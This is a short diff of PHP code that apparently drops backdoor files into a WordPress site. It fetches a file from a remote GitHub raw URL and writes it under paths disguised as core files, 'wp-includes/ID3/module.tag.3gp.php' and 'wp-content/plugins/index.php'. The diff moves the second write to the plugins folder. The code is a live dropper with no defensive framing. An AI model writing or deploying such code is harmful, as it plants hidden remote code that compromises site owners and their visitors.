@@ -20,7 +20,7 @@ $nama= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-includes/ID3/module.tag.3gp.php' ,
  fclose($nama); ?>
  
  <?php 
-$nama1= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-includes/ID3/module.tag.3gp.php' ,'w+');
+$nama1= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/index.php' ,'w+');
   $file1 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/404');
   $tulis1 = fwrite ($nama1 ,$file1);
  fclose($nama1); ?>
